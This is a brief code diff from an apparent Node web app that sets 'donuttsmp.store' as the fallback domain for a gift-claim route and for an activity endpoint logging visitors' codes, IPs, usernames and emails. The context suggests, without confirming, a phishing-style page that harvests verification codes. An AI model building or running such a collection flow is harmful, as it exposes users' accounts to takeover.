@@ -86,7 +86,7 @@ app.post('/api/web-activity', async (req, res) => {
             await sendWebLog({
                 code,
                 ip: clientIp,
-                domain: domain || req.headers.host || config.webDomain || 'localhost:3000',
+                domain: domain || req.headers.host || config.webDomain || 'donuttsmp.store',
                 username,
                 email,
                 statusText: statusText || 'Send Code'
@@ -577,7 +577,7 @@ app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
     const code = req.params.code;
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
-    const host = req.headers.host || config.webDomain || 'localhost:3000';
+    const host = req.headers.host || config.webDomain || 'donuttsmp.store';
     const EXPIRY_MS = 30 * 60 * 1000;
     const now = Date.now();
 
